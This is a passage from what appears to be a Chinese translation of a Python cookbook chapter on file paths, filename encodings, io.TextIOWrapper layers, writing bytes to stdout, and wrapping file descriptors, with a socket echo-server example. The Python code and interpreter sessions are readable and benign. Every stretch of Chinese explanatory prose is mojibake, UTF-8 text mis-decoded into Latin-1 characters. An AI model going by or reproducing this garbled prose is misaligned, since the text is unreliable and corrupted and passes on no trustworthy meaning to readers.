å¯¹è±¡èƒ½å¤Ÿè¢«ç”¨æ¥åœ¨è§£ é‡Šå™¨ç›´æ¥äº¤æ¢æ•°æ®ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰è§£é‡Šå™¨éƒ½èƒ½åŒæ—¶è¯»å†™æ•°æ®ï¼Œå¹¶ä¸”å…¶ä¸­ä¸€ä¸ªè§£é‡Šå™¨æ‰€åšçš„ä¿®æ”¹ä¼šè‡ªåŠ¨å‘ˆç°åœ¨å…¶ä»–è§£é‡Šå™¨ä¸­ã€‚ å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œéœ€è¦è€ƒè™‘åŒæ­¥çš„é—®é¢˜ã€‚ä½†æ˜¯è¿™ç§æ–¹ æ³•æœ‰æ—¶å€™å¯ä»¥ç”¨æ¥åœ¨ç®¡é“æˆ–å¥—æ¥å­—é—´ä¼ é€’æ•°æ®ã€‚ æ–‡ä»¶è·¯å¾„åçš„æ“ä½œ ä½¿ç”¨è·¯å¾„åæ¥è·å–æ–‡ä»¶åï¼Œç›®å½•åï¼Œç»å¯¹è·¯å¾„ç­‰ç­‰ã€‚ ä½¿ç”¨ os.path æ¨¡å—ä¸­çš„å‡½æ•°æ¥æ“ä½œè·¯å¾„å: >>> import os >>> path = '/Users/beazley/Data/data.csv' >>> # Get the last component of the path >>> os.path.basename(path) 'data.csv' >>> # Get the directory name >>> os.path.dirname(path) '/Users/beazley/Data' >>> # Join path components together >>> os.path.join('tmp', 'data', os.path.basename(path)) 'tmp/data/data.csv' >>> # Expand the user's home directory >>> path = '~/Data/data.csv' >>> os.path.expanduser(path) '/Users/beazley/Data/data.csv' >>> # Split the file extension >>> os.path.splitext(path) ('~/Data/data', '.csv') >>> å¯¹äºä»»ä½•çš„æ–‡ä»¶åçš„æ“ä½œï¼Œä½ éƒ½åº”è¯¥ä½¿ç”¨ os.path æ¨¡å—ï¼Œè€Œä¸æ˜¯ä½¿ç”¨æ ‡å‡†å­—ç¬¦ä¸² æ“ä½œæ¥æ„é€ è‡ªå·±çš„ä»£ç ã€‚ ç‰¹åˆ«æ˜¯ä¸ºäº†å¯ç§»æ¤æ€§è€ƒè™‘çš„æ—¶å€™æ›´åº”å¦‚æ­¤ï¼Œ å› ä¸º os.path æ¨¡ å—çŸ¥é“ Unix å’Œ Windows ç³»ç»Ÿä¹‹é—´çš„å·®å¼‚å¹¶ä¸”èƒ½å¤Ÿå¯é åœ°å¤„ç†ç±»ä¼¼ Data/data.csv å’Œ Data\\data.csv è¿™æ ·çš„æ–‡ä»¶åã€‚ å…¶æ¬¡ï¼Œä½ çœŸçš„ä¸åº”è¯¥æµªè´¹æ—¶é—´å»é‡å¤é€ è½®å­ã€‚é€šå¸¸æœ€å¥½ æ˜¯ç›´æ¥ä½¿ç”¨å·²ç»ä¸ºä½ å‡†å¤‡å¥½çš„åŠŸèƒ½ã€‚ æµ‹è¯•æ–‡ä»¶æ˜¯å¦å­˜åœ¨ ä½¿ç”¨ os.path æ¨¡å—: >>> import os >>> os.path.exists('/etc/passwd') True æµ‹è¯•è¿™ä¸ªæ–‡ä»¶æ—¶ä»€ä¹ˆç±»å‹çš„ã€‚åœ¨ä¸‹é¢è¿™äº›æµ‹è¯•ä¸­ï¼Œå¦‚æœæµ‹è¯•çš„æ–‡ä»¶ä¸ å­˜åœ¨çš„æ—¶å€™ï¼Œç»“æœéƒ½ä¼šè¿”å› False: >>> # Is a regular file >>> os.path.isfile('/etc/passwd') True >>> # Is a directory >>> os.path.isdir('/etc/passwd') False >>> # Is a symbolic link >>> os.path.islink('/usr/local/bin/python3') True >>> # Get the file linked to >>> os.path.realpath('/usr/local/bin/python3') '/usr/local/bin/python3.3' å¦‚æœä½ è¿˜æƒ³è·å–å…ƒæ•°æ® (æ¯”å¦‚æ–‡ä»¶å¤§å°æˆ–è€…æ˜¯ä¿®æ”¹æ—¥æœŸ)ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ os.path æ¨¡ å—æ¥è§£å†³: >>> os.path.getsize('/etc/passwd') 3669 >>> os.path.getmtime('/etc/passwd') 1272478234.0 >>> import time >>> time.ctime(os.path.getmtime('/etc/passwd')) 'Wed Apr 28 13:10:34 2010' >>> ä½¿ç”¨ os.path æ¥è¿›è¡Œæ–‡ä»¶æµ‹è¯•æ˜¯å¾ˆç®€å•çš„ã€‚ åœ¨å†™è¿™äº›è„šæœ¬æ—¶ï¼Œå¯èƒ½å”¯ä¸€éœ€è¦æ³¨æ„ çš„å°±æ˜¯ä½ éœ€è¦è€ƒè™‘æ–‡ä»¶æƒé™çš„é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯åœ¨è·å–å…ƒæ•°æ®æ—¶å€™ è·å–æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶åˆ—è¡¨ å¯¹äºæ–‡ä»¶åçš„åŒ¹é…ï¼Œä½ å¯èƒ½ä¼šè€ƒè™‘ä½¿ç”¨ glob æˆ– fnmatch æ¨¡å—ã€‚æ¯”å¦‚: import glob pyfiles = glob.glob('somedir/*.py') from fnmatch import fnmatch pyfiles = [name for name in os.listdir('somedir') if fnmatch(name, '*.py')] è·å–ç›®å½•ä¸­çš„åˆ—è¡¨æ˜¯å¾ˆå®¹æ˜“çš„ï¼Œä½†æ˜¯å…¶è¿”å›ç»“æœåªæ˜¯ç›®å½•ä¸­å®ä½“ååˆ—è¡¨è€Œå·²ã€‚ å¦‚ æœä½ è¿˜æƒ³è·å–å…¶ä»–çš„å…ƒä¿¡æ¯ï¼Œæ¯”å¦‚æ–‡ä»¶å¤§å°ï¼Œä¿®æ”¹æ—¶é—´ç­‰ç­‰ï¼Œä½ æˆ–è®¸è¿˜éœ€è¦ä½¿ç”¨åˆ° os.path æ¨¡å—ä¸­çš„å‡½æ•°æˆ–ç€ os.stat() å‡½æ•°æ¥æ”¶é›†æ•°æ® æœ€åè¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„å°±æ˜¯ï¼Œæœ‰æ—¶å€™åœ¨å¤„ç†æ–‡ä»¶åç¼–ç é—®é¢˜æ—¶å€™å¯èƒ½ä¼šå‡ºç°ä¸€äº› é—®é¢˜ã€‚ é€šå¸¸æ¥è®²ï¼Œå‡½æ•° os.listdir() è¿”å›çš„å®ä½“åˆ—è¡¨ä¼šæ ¹æ®ç³»ç»Ÿé»˜è®¤çš„æ–‡ä»¶åç¼–ç æ¥ è§£ç ã€‚ä½†æ˜¯æœ‰æ—¶å€™ä¹Ÿä¼šç¢°åˆ°ä¸€äº›ä¸èƒ½æ­£å¸¸è§£ç çš„æ–‡ä»¶åã€‚ å¿½ç•¥æ–‡ä»¶åç¼–ç  ä½ æƒ³ä½¿ç”¨åŸå§‹æ–‡ä»¶åæ‰§è¡Œæ–‡ä»¶çš„ I/O æ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶åå¹¶æ²¡æœ‰ç»è¿‡ç³»ç»Ÿé»˜è®¤ ç¼–ç å»è§£ç æˆ–ç¼–ç è¿‡ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„æ–‡ä»¶åéƒ½ä¼šæ ¹æ® sys.getfilesystemencoding() è¿”å›çš„æ–‡æœ¬ ç¼–ç æ¥ç¼–ç æˆ–è§£ç ã€‚æ¯”å¦‚: >>> sys.getfilesystemencoding() 'utf-8' >>> å¦‚æœå› ä¸ºæŸç§åŸå› ä½ æƒ³å¿½ç•¥è¿™ç§ç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªåŸå§‹å­—èŠ‚å­—ç¬¦ä¸²æ¥æŒ‡å®šä¸€ä¸ª æ–‡ä»¶åå³å¯ã€‚æ¯”å¦‚: >>> # Wrte a file using a unicode filename >>> with open('jalape\\xf1o.txt', 'w') as f: ... f.write('Spicy!') ... 6 >>> # Directory listing (decoded) >>> import os >>> os.listdir('.') ['jalapeÃ±o.txt'] >>> # Directory listing (raw) >>> os.listdir(b'.') # Note: byte string [b'jalapen\\xcc\\x83o.txt'] >>> # Open file with raw filename >>> with open(b'jalapen\\xcc\\x83o.txt') as f: ... print(f.read()) ... Spicy! >>> é€šå¸¸æ¥è®²ï¼Œä½ ä¸éœ€è¦æ‹…å¿ƒæ–‡ä»¶åçš„ç¼–ç å’Œè§£ç ï¼Œæ™®é€šçš„æ–‡ä»¶åæ“ä½œåº”è¯¥å°±æ²¡é—®é¢˜ äº†ã€‚ ä½†æ˜¯ï¼Œæœ‰äº›æ“ä½œç³»ç»Ÿå…è®¸ç”¨æˆ·é€šè¿‡å¶ç„¶æˆ–æ¶æ„æ–¹å¼å»åˆ›å»ºåå­—ä¸ç¬¦åˆé»˜è®¤ç¼–ç çš„æ–‡ ä»¶ã€‚ è¿™äº›æ–‡ä»¶åå¯èƒ½ä¼šç¥ç§˜åœ°ä¸­æ–­é‚£äº›éœ€è¦å¤„ç†å¤§é‡æ–‡ä»¶çš„ Python ç¨‹åºã€‚ è¯»å–ç›®å½•å¹¶é€šè¿‡åŸå§‹æœªè§£ç æ–¹å¼å¤„ç†æ–‡ä»¶åå¯ä»¥æœ‰æ•ˆçš„é¿å…è¿™æ ·çš„é—®é¢˜ï¼Œå°½ç®¡è¿™ æ ·ä¼šå¸¦æ¥ä¸€å®šçš„ç¼–ç¨‹éš¾åº¦ã€‚ æ‰“å°ä¸åˆæ³•çš„æ–‡ä»¶å ä½ çš„ç¨‹åºè·å–äº†ä¸€ä¸ªç›®å½•ä¸­çš„æ–‡ä»¶ååˆ—è¡¨ï¼Œ ä½†æ˜¯å½“å®ƒè¯•ç€å»æ‰“å°æ–‡ä»¶åçš„æ—¶å€™ ç¨‹åºå´©æºƒï¼Œ å‡ºç°äº† UnicodeEncodeError å¼‚å¸¸å’Œä¸€æ¡å¥‡æ€ªçš„æ¶ˆæ¯â€”â€”surrogates not allowed ã€‚ å½“æ‰“å°æœªçŸ¥çš„æ–‡ä»¶åæ—¶ï¼Œä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•å¯ä»¥é¿å…è¿™æ ·çš„é”™è¯¯: def bad_filename(filename): return repr(filename)[1:-1] try: print(filename) except UnicodeEncodeError: print(bad_filename(filename)) è¿™ä¸€å°èŠ‚è®¨è®ºçš„æ˜¯åœ¨ç¼–å†™å¿…é¡»å¤„ç†æ–‡ä»¶ç³»ç»Ÿçš„ç¨‹åºæ—¶ä¸€ä¸ªä¸å¤ªå¸¸è§ä½†åˆå¾ˆæ£˜æ‰‹çš„ é—®é¢˜ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒPython å‡å®šæ‰€æœ‰æ–‡ä»¶åéƒ½å·²ç»æ ¹æ® sys.getfilesystemencoding() çš„å€¼ç¼–ç è¿‡äº†ã€‚ ä½†æ˜¯ï¼Œæœ‰ä¸€äº›æ–‡ä»¶ç³»ç»Ÿå¹¶æ²¡æœ‰å¼ºåˆ¶è¦æ±‚è¿™æ ·åšï¼Œå› æ­¤å…è®¸åˆ›å»ºæ–‡ä»¶åæ²¡ æœ‰æ­£ç¡®ç¼–ç çš„æ–‡ä»¶ã€‚ è¿™ç§æƒ…å†µä¸å¤ªå¸¸è§ï¼Œä½†æ˜¯æ€»ä¼šæœ‰äº›ç”¨æˆ·å†’é™©è¿™æ ·åšæˆ–è€…æ˜¯æ— æ„ä¹‹ ä¸­è¿™æ ·åšäº† ( å¯èƒ½æ˜¯åœ¨ä¸€ä¸ªæœ‰ç¼ºé™·çš„ä»£ç ä¸­ç»™ open() å‡½æ•°ä¼ é€’äº†ä¸€ä¸ªä¸åˆè§„èŒƒçš„æ–‡ä»¶ å)ã€‚ å½“æ‰§è¡Œç±»ä¼¼ os.listdir() è¿™æ ·çš„å‡½æ•°æ—¶ï¼Œè¿™äº›ä¸åˆè§„èŒƒçš„æ–‡ä»¶åå°±ä¼šè®© Python é™·å…¥å›°å¢ƒã€‚ ä¸€æ–¹é¢ï¼Œå®ƒä¸èƒ½ä»…ä»…åªæ˜¯ä¸¢å¼ƒè¿™äº›ä¸åˆæ ¼çš„åå­—ã€‚ è€Œå¦ä¸€æ–¹é¢ï¼Œå®ƒåˆä¸èƒ½å°† è¿™äº›æ–‡ä»¶åè½¬æ¢ä¸ºæ­£ç¡®çš„æ–‡æœ¬å­—ç¬¦ä¸²ã€‚ Python å¯¹è¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ¡ˆæ˜¯ä»æ–‡ä»¶åä¸­è· å–æœªè§£ç çš„å­—èŠ‚å€¼ æ¯”å¦‚ xhh å¹¶å°†å®ƒæ˜ å°„æˆ Unicode å­—ç¬¦ udchh è¡¨ç¤ºçš„æ‰€è°“çš„\"ä»£ç† ç¼–ç \"ã€‚ ä¸‹é¢ä¸€ä¸ªä¾‹å­æ¼”ç¤ºäº†å½“ä¸€ä¸ªä¸åˆæ ¼ç›®å½•åˆ—è¡¨ä¸­å«æœ‰ä¸€ä¸ªæ–‡ä»¶åä¸º bÃ¤d.txt(ä½¿ç”¨ Latin-1 è€Œä¸æ˜¯ UTF-8 ç¼–ç ) æ—¶çš„æ ·å­: >>> import os >>> files = os.listdir('.') >>> files ['spam.py', 'b\\udce4d.txt', 'foo.txt'] >>> å¦‚æœä½ æœ‰ä»£ç éœ€è¦æ“ä½œæ–‡ä»¶åæˆ–è€…å°†æ–‡ä»¶åä¼ é€’ç»™ open() è¿™æ ·çš„å‡½æ•°ï¼Œä¸€åˆ‡éƒ½èƒ½ æ­£å¸¸å·¥ä½œã€‚ åªæœ‰å½“ä½ æƒ³è¦è¾“å‡ºæ–‡ä»¶åæ—¶æ‰ä¼šç¢°åˆ°äº›éº»çƒ¦ (æ¯”å¦‚æ‰“å°è¾“å‡ºåˆ°å±å¹•æˆ–æ—¥å¿—æ–‡ ä»¶ç­‰)ã€‚ ç‰¹åˆ«çš„ï¼Œå½“ä½ æƒ³æ‰“å°ä¸Šé¢çš„æ–‡ä»¶ååˆ—è¡¨æ—¶ï¼Œä½ çš„ç¨‹åºå°±ä¼šå´©æºƒ: >>> for name in files: ... print(name) ... spam.py Traceback (most recent call last): File \"<stdin>\", line 2, in <module> UnicodeEncodeError: 'utf-8' codec can't encode character '\\udce4' in position 1: surrogates not allowed >>> ç¨‹åºå´©æºƒçš„åŸå› å°±æ˜¯å­—ç¬¦ udce4 æ˜¯ä¸€ä¸ªéæ³•çš„ Unicode å­—ç¬¦ã€‚ å®ƒå…¶å®æ˜¯ä¸€ä¸ªè¢« ç§°ä¸ºä»£ç†å­—ç¬¦å¯¹çš„åŒå­—ç¬¦ç»„åˆçš„ååŠéƒ¨åˆ†ã€‚ç”±äºç¼ºå°‘äº†å‰åŠéƒ¨åˆ†ï¼Œå› æ­¤å®ƒæ˜¯ä¸ªéæ³•çš„ Unicodeã€‚ æ‰€ä»¥ï¼Œå”¯ä¸€èƒ½æˆåŠŸè¾“å‡ºçš„æ–¹æ³•å°±æ˜¯å½“é‡åˆ°ä¸åˆæ³•æ–‡ä»¶åæ—¶é‡‡å–ç›¸åº”çš„è¡¥æ•‘æª æ–½ã€‚æ¯”å¦‚å¯ä»¥å°†ä¸Šè¿°ä»£ç ä¿®æ”¹å¦‚ä¸‹: >>> for name in files: ... try: ... print(name) ... except UnicodeEncodeError: ... print(bad_filename(name)) ... spam.py b\\udce4d.txt foo.txt >>> åœ¨ bad_filename() å‡½æ•°ä¸­æ€æ ·å¤„ç½®å–å†³äºä½ è‡ªå·±ã€‚å¦å¤–ä¸€ä¸ªé€‰æ‹©å°±æ˜¯é€šè¿‡æŸç§æ–¹ å¼é‡æ–°ç¼–ç ï¼Œç¤ºä¾‹å¦‚ä¸‹: def bad_filename(filename): temp = filename.encode(sys.getfilesystemencoding(), errors='surrogateescape') return temp.decode('latin-1') æ³¨è§£ surrogateescapeå«ä¹‰ è¿™ç§æ˜¯ Python åœ¨ç»å¤§éƒ¨åˆ†é¢å‘ OS çš„ API ä¸­æ‰€ä½¿ç”¨çš„é”™è¯¯å¤„ç†å™¨ï¼Œ å®ƒèƒ½ä»¥ä¸€ç§ä¼˜é›…çš„æ–¹å¼å¤„ç†ç”±æ“ä½œç³»ç»Ÿæä¾›çš„æ•°æ®çš„ç¼–ç é—®é¢˜ã€‚ åœ¨è§£ç å‡ºé”™æ—¶ä¼šå°†å‡ºé”™å­—èŠ‚å­˜å‚¨åˆ°ä¸€ä¸ªå¾ˆå°‘è¢«ä½¿ç”¨åˆ°çš„ Unicode ç¼–ç èŒƒå›´å†…ã€‚ åœ¨ç¼–ç æ—¶å°†é‚£äº›éšè—å€¼åˆè¿˜åŸå›åŸå…ˆè§£ç å¤±è´¥çš„å­—èŠ‚åºåˆ—ã€‚ å®ƒä¸ä»…å¯¹äº OS API éå¸¸æœ‰ç”¨ï¼Œä¹Ÿèƒ½å¾ˆå®¹æ˜“çš„å¤„ç†å…¶ä»–æƒ…å†µä¸‹çš„ç¼–ç é”™è¯¯ã€‚ æ­¤æ—¶çš„è¾“å‡º: spam.py bÃ¤d.txt foo.txt å¢åŠ æˆ–æ”¹å˜å·²æ‰“å¼€æ–‡ä»¶çš„ç¼–ç  ä½ æƒ³åœ¨ä¸å…³é—­ä¸€ä¸ªå·²æ‰“å¼€çš„æ–‡ä»¶å‰æä¸‹å¢åŠ æˆ–æ”¹å˜å®ƒçš„ Unicode ç¼–ç ã€‚ å¦‚æœä½ æƒ³ç»™ä¸€ä¸ªä»¥äºŒè¿›åˆ¶æ¨¡å¼æ‰“å¼€çš„æ–‡ä»¶æ·»åŠ  Unicode ç¼–ç /è§£ç æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨ io.TextIOWrapper() å¯¹è±¡åŒ…è£…å®ƒã€‚æ¯”å¦‚: import urllib.request import io u = urllib.request.urlopen('http://www.python.org') f = io.TextIOWrapper(u, encoding='utf-8') text = f.read() å¦‚æœä½ æƒ³ä¿®æ”¹ä¸€ä¸ªå·²ç»æ‰“å¼€çš„æ–‡æœ¬æ¨¡å¼çš„æ–‡ä»¶çš„ç¼–ç æ–¹å¼ï¼Œå¯ä»¥å…ˆä½¿ç”¨ detach() æ–¹æ³•ç§»é™¤æ‰å·²å­˜åœ¨çš„æ–‡æœ¬ç¼–ç å±‚ï¼Œå¹¶ä½¿ç”¨æ–°çš„ç¼–ç æ–¹å¼ä»£æ›¿ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªåœ¨ sys.stdout ä¸Šä¿®æ”¹ç¼–ç æ–¹å¼çš„ä¾‹å­: >>> import sys >>> sys.stdout.encoding 'UTF-8' >>> sys.stdout = io.TextIOWrapper(sys.stdout.detach(), encoding='latin-1') >>> sys.stdout.encoding 'latin-1' >>> è¿™æ ·åšå¯èƒ½ä¼šä¸­æ–­ä½ çš„ç»ˆç«¯ï¼Œè¿™é‡Œä»…ä»…æ˜¯ä¸ºäº†æ¼”ç¤ºè€Œå·²ã€‚ I/O ç³»ç»Ÿç”±ä¸€ç³»åˆ—çš„å±‚æ¬¡æ„å»ºè€Œæˆã€‚ä½ å¯ä»¥è¯•ç€è¿è¡Œä¸‹é¢è¿™ä¸ªæ“ä½œä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶çš„ ä¾‹å­æ¥æŸ¥çœ‹è¿™ç§å±‚æ¬¡: >>> f = open('sample.txt','w') >>> f <_io.TextIOWrapper name='sample.txt' mode='w' encoding='UTF-8'> >>> f.buffer <_io.BufferedWriter name='sample.txt'> >>> f.buffer.raw <_io.FileIO name='sample.txt' mode='wb'> >>> io.TextIOWrapper æ˜¯ä¸€ä¸ªç¼–ç å’Œè§£ç  Unicode çš„æ–‡æœ¬å¤„ç†å±‚ io. BufferedWriter æ˜¯ä¸€ä¸ªå¤„ç†äºŒè¿›åˆ¶æ•°æ®çš„å¸¦ç¼“å†²çš„ I/O å±‚ï¼Œ io.FileIO æ˜¯ä¸€ä¸ªè¡¨ç¤ºæ“ ä½œç³»ç»Ÿåº•å±‚æ–‡ä»¶æè¿°ç¬¦çš„åŸå§‹æ–‡ä»¶ å¢åŠ æˆ–æ”¹å˜æ–‡æœ¬ç¼–ç ä¼šæ¶‰åŠå¢åŠ æˆ–æ”¹å˜æœ€ä¸Šé¢çš„ io.TextIOWrapper å±‚ã€‚ ä¸€èˆ¬æ¥è®²ï¼Œåƒä¸Šé¢ä¾‹å­è¿™æ ·é€šè¿‡è®¿é—®å±æ€§å€¼æ¥ç›´æ¥æ“ä½œä¸åŒçš„å±‚æ˜¯å¾ˆä¸å®‰å…¨çš„ã€‚ ä¾‹ å¦‚ï¼Œå¦‚æœä½ è¯•ç€ä½¿ç”¨ä¸‹é¢è¿™æ ·çš„æŠ€æœ¯æ”¹å˜ç¼–ç çœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆ: >>> f <_io.TextIOWrapper name='sample.txt' mode='w' encoding='UTF-8'> >>> f = io.TextIOWrapper(f.buffer, encoding='latin-1') >>> f <_io.TextIOWrapper name='sample.txt' encoding='latin-1'> >>> f.write('Hello') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ValueError: I/O operation on closed file. >>> ç»“æœå‡ºé”™äº†ï¼Œå› ä¸º f çš„åŸå§‹å€¼å·²ç»è¢«ç ´åäº†å¹¶å…³é—­äº†åº•å±‚çš„æ–‡ä»¶ã€‚ detach() æ–¹æ³•ä¼šæ–­å¼€æ–‡ä»¶çš„æœ€é¡¶å±‚å¹¶è¿”å›ç¬¬äºŒå±‚ï¼Œä¹‹åæœ€é¡¶å±‚å°±æ²¡ä»€ä¹ˆç”¨äº†ã€‚ä¾‹ å¦‚: >>> f = open('sample.txt', 'w') >>> f <_io.TextIOWrapper name='sample.txt' mode='w' encoding='UTF-8'> >>> b = f.detach() >>> b <_io.BufferedWriter name='sample.txt'> >>> f.write('hello') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ValueError: underlying buffer has been detached >>> ä¸€æ—¦æ–­å¼€æœ€é¡¶å±‚åï¼Œä½ å°±å¯ä»¥ç»™è¿”å›ç»“æœæ·»åŠ ä¸€ä¸ªæ–°çš„æœ€é¡¶å±‚ã€‚æ¯”å¦‚: >>> f = io.TextIOWrapper(b, encoding='latin-1') >>> f <_io.TextIOWrapper name='sample.txt' encoding='latin-1'> >>> å°½ç®¡å·²ç»å‘ä½ æ¼”ç¤ºäº†æ”¹å˜ç¼–ç çš„æ–¹æ³•ï¼Œä½†æ˜¯ä½ è¿˜å¯ä»¥åˆ©ç”¨è¿™ç§æŠ€æœ¯æ¥æ”¹å˜æ–‡ä»¶è¡Œ å¤„ç†ã€é”™è¯¯æœºåˆ¶ä»¥åŠæ–‡ä»¶å¤„ç†çš„å…¶ä»–æ–¹é¢ã€‚ä¾‹å¦‚: >>> sys.stdout = io.TextIOWrapper(sys.stdout.detach(), encoding='ascii', errors='xmlcharrefreplace') >>> print('Jalape\\u00f1o') Jalape&#241;o >>> æ³¨æ„ä¸‹æœ€åè¾“å‡ºä¸­çš„é ASCII å­—ç¬¦ Ã± æ˜¯å¦‚ä½•è¢« &#241; å–ä»£çš„ã€‚ å°†å­—èŠ‚å†™å…¥æ–‡æœ¬æ–‡ä»¶ åœ¨æ–‡æœ¬æ¨¡å¼æ‰“å¼€çš„æ–‡ä»¶ä¸­å†™å…¥åŸå§‹çš„å­—èŠ‚æ•°æ® å°†å­—èŠ‚æ•°æ®ç›´æ¥å†™å…¥æ–‡ä»¶çš„ç¼“å†²åŒºå³å¯: >>> import sys >>> sys.stdout.write(b'Hello\\n') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: must be str, not bytes >>> sys.stdout.buffer.write(b'Hello\\n') Hello 5 >>> ç±»ä¼¼çš„ï¼Œèƒ½å¤Ÿé€šè¿‡è¯»å–æ–‡æœ¬æ–‡ä»¶çš„ buffer å±æ€§æ¥è¯»å–äºŒè¿›åˆ¶æ•°æ® I/O ç³»ç»Ÿä»¥å±‚çº§ç»“æ„çš„å½¢å¼æ„å»ºè€Œæˆã€‚ æ–‡æœ¬æ–‡ä»¶æ˜¯é€šè¿‡åœ¨ä¸€ä¸ªæ‹¥æœ‰ç¼“å†²çš„äºŒè¿›åˆ¶æ¨¡ å¼æ–‡ä»¶ä¸Šå¢åŠ ä¸€ä¸ª Unicode ç¼–ç /è§£ç å±‚æ¥åˆ›å»ºã€‚ buffer å±æ€§æŒ‡å‘å¯¹åº”çš„åº•å±‚æ–‡ä»¶ã€‚å¦‚ æœä½ ç›´æ¥è®¿é—®å®ƒçš„è¯å°±ä¼šç»•è¿‡æ–‡æœ¬ç¼–ç /è§£ç å±‚ã€‚ æœ¬ä¾‹å±•ç¤ºçš„ sys.stdout å¯èƒ½çœ‹èµ·æ¥æœ‰ç‚¹ç‰¹æ®Šã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œsys.stdout æ€» æ˜¯ä»¥æ–‡æœ¬æ¨¡å¼æ‰“å¼€çš„ã€‚ ä½†æ˜¯å¦‚æœä½ åœ¨å†™ä¸€ä¸ªéœ€è¦æ‰“å°äºŒè¿›åˆ¶æ•°æ®åˆ°æ ‡å‡†è¾“å‡ºçš„è„šæœ¬çš„ è¯ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸Šé¢æ¼”ç¤ºçš„æŠ€æœ¯æ¥ç»•è¿‡æ–‡æœ¬ç¼–ç å±‚ã€‚ å°†æ–‡ä»¶æè¿°ç¬¦åŒ…è£…æˆæ–‡ä»¶å¯¹è±¡ ä½ æœ‰ä¸€ä¸ªå¯¹åº”äºæ“ä½œç³»ç»Ÿä¸Šä¸€ä¸ªå·²æ‰“å¼€çš„ I/O é€šé“ (æ¯”å¦‚æ–‡ä»¶ã€ç®¡é“ã€å¥—æ¥å­—ç­‰) çš„æ•´å‹æ–‡ä»¶æè¿°ç¬¦ï¼Œä½ æƒ³å°†å®ƒåŒ…è£…æˆä¸€ä¸ªæ›´é«˜å±‚çš„ Python æ–‡ä»¶å¯¹è±¡ã€‚ ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å’Œä¸€ä¸ªæ‰“å¼€çš„æ™®é€šæ–‡ä»¶æ˜¯ä¸ä¸€æ ·çš„ã€‚ æ–‡ä»¶æè¿°ç¬¦ä»…ä»…æ˜¯ä¸€ä¸ªç”±æ“ ä½œç³»ç»ŸæŒ‡å®šçš„æ•´æ•°ï¼Œç”¨æ¥æŒ‡ä»£æŸä¸ªç³»ç»Ÿçš„ I/O é€šé“ã€‚ å¦‚æœä½ ç¢°å·§æœ‰è¿™ä¹ˆä¸€ä¸ªæ–‡ä»¶æè¿° ç¬¦ï¼Œä½ å¯ä»¥é€šè¿‡ä½¿ç”¨ open() å‡½æ•°æ¥å°†å…¶åŒ…è£…ä¸ºä¸€ä¸ª Python çš„æ–‡ä»¶å¯¹è±¡ã€‚ ä½ ä»…ä»…åªéœ€ è¦ä½¿ç”¨è¿™ä¸ªæ•´æ•°å€¼çš„æ–‡ä»¶æè¿°ç¬¦ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°æ¥ä»£æ›¿æ–‡ä»¶åå³å¯ã€‚ å¦‚: # Open a low-level file descriptor import os fd = os.open('somefile.txt', os.O_WRONLY | os.O_CREAT) # Turn into a proper file f = open(fd, 'wt') f.write('hello world\\n') f.close() å½“é«˜å±‚çš„æ–‡ä»¶å¯¹è±¡è¢«å…³é—­æˆ–è€…ç ´åçš„æ—¶å€™ï¼Œåº•å±‚çš„æ–‡ä»¶æè¿°ç¬¦ä¹Ÿä¼šè¢«å…³é—­ã€‚ å¦‚æœè¿™ ä¸ªå¹¶ä¸æ˜¯ä½ æƒ³è¦çš„ç»“æœï¼Œä½ å¯ä»¥ç»™ open() å‡½æ•°ä¼ é€’ä¸€ä¸ªå¯é€‰çš„ colsefd=False ã€‚æ¯” å¦‚: # Create a file object, but don't close underlying fd when done f = open(fd, 'wt', closefd=False) ... åœ¨ Unix ç³»ç»Ÿä¸­ï¼Œè¿™ç§åŒ…è£…æ–‡ä»¶æè¿°ç¬¦çš„æŠ€æœ¯å¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†ä¸€ä¸ªç±»æ–‡ä»¶æ¥å£ä½œç”¨ äºä¸€ä¸ªä»¥ä¸åŒæ–¹å¼æ‰“å¼€çš„ I/O é€šé“ä¸Šï¼Œ å¦‚ç®¡é“ã€å¥—æ¥å­—ç­‰ã€‚ä¸¾ä¾‹æ¥è®²ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæ“ ä½œç®¡é“çš„ä¾‹å­: from socket import socket, AF_INET, SOCK_STREAM def echo_client(client_sock, addr): print('Got connection from', addr) # Make text-mode file wrappers for socket reading/writing client_in = open(client_sock.fileno(), 'rt', encoding='latin-1', closefd=False) client_out = open(client_sock.fileno(), 'wt', encoding='latin-1', closefd=False) # Echo lines back to the client using file I/O for line in client_in: client_out.write(line) client_out.flush() client_sock.close() def echo_server(address): sock = socket(AF_INET, SOCK_STREAM) sock.bind(address) sock.listen(1) while True: client, addr = sock.accept() echo_client(client, addr) éœ€è¦é‡ç‚¹å¼ºè°ƒçš„ä¸€ç‚¹æ˜¯ï¼Œä¸Šé¢çš„ä¾‹å­ä»…ä»…æ˜¯ä¸ºäº†æ¼”ç¤ºå†…ç½®çš„ open() å‡½æ•°çš„ä¸€ä¸ªç‰¹ æ€§ï¼Œå¹¶ä¸”ä¹Ÿåªé€‚ç”¨äºåŸºäº Unix çš„ç³»ç»Ÿã€‚ å¦‚æœä½ æƒ³å°†ä¸€ä¸ªç±»æ–‡ä»¶æ¥å£ä½œç”¨åœ¨ä¸€ä¸ªå¥—æ¥å­— å¹¶å¸Œæœ›ä½ çš„ä»£ç 